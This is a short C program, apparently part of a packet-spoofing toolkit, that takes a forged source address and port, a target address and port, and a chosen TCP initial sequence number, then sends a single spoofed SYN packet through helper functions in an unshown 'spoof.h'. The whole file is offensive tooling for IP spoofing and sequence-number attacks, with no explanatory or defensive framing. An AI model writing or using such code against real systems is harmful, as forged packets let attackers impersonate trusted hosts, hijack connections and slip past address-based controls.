#include "spoof.h"

void main(int argc, char *argv[])
{
	int fd;
	if (argc!=6) 
	{
		printf("Try %s spoof_src_addr spoof_src_port spoof_dest_addr spoof_dest_port ISN\n",argv[0]);
		exit(0);
	} 
		
	fd = open_sending();
	transmit_TCP(fd,NULL,0,0,0,argv[3],atoi(argv[4]),argv[1],atoi(argv[2]),atoi(argv[5]),0,SYN);
}

